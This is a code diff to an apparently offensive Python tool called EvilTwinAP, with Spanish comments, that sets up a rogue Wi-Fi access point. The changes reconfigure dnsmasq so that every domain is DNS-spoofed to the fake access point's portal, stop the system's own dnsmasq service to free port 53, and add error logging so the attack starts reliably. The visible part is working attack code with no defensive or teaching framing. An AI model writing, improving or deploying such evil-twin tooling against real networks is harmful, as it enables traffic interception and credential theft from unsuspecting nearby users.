@@ -216,13 +216,18 @@ class EvilTwinAP:
     # ------------------------------------------------------------------ #
 
     def _write_dnsmasq_conf(self) -> str:
+        pid_file = tempfile.mktemp(suffix=".pid", prefix="dnsmasq_et_")
+        self._tmpfiles.append(pid_file)
         conf = (
             f"interface={self.iface}\n"
-            "bind-interfaces\n"
+            "except-interface=lo\n"
+            "bind-dynamic\n"               # evita conflicto con instancias del sistema
             f"dhcp-range={self.DHCP_RANGE}\n"
             f"address=/#/{self.AP_IP}\n"   # DNS spoof: todo dominio → portal
             "dhcp-option=3\n"              # sin gateway predeterminado
             "no-resolv\n"
+            f"pid-file={pid_file}\n"
+            "log-queries\n"
         )
         f = tempfile.NamedTemporaryFile(
             mode="w", suffix=".conf", prefix="dnsmasq_et_", delete=False
@@ -394,18 +399,31 @@ class EvilTwinAP:
         print(f"[+] AP falso activo → '{self.ssid}'")
 
         # 3. dnsmasq
+        # Detener el servicio del sistema si está corriendo (libera puerto 53)
+        subprocess.run(["systemctl", "stop", "dnsmasq"], capture_output=True)
+        subprocess.run(["pkill", "-x", "dnsmasq"],      capture_output=True)
+        time.sleep(0.4)
+
         dnsmasq_conf = self._write_dnsmasq_conf()
+        dnsmasq_log = tempfile.SpooledTemporaryFile(max_size=65536)
         dnsmasq_proc = subprocess.Popen(
             ["dnsmasq", "--no-daemon", f"--conf-file={dnsmasq_conf}"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+            stdout=dnsmasq_log,
+            stderr=dnsmasq_log,
         )
         self._procs.append(dnsmasq_proc)
-        time.sleep(0.5)
+        time.sleep(1.0)
         if dnsmasq_proc.poll() is not None:
+            dnsmasq_log.seek(0)
+            err = dnsmasq_log.read().decode("utf-8", errors="replace").strip()
+            dnsmasq_log.close()
             print("[-] dnsmasq falló al iniciar.")
-            print("[-] Verifica que esté instalado: sudo apt install dnsmasq")
+            if err:
+                print(f"[-] Salida de dnsmasq:\n{err}")
+            else:
+                print("[-] Sin salida de error. Comprueba: sudo journalctl -u dnsmasq -n 20")
             return False
+        dnsmasq_log.close()
         print(f"[+] DHCP + DNS spoof activos  →  {self.AP_IP}")
 
         # 4. iptables
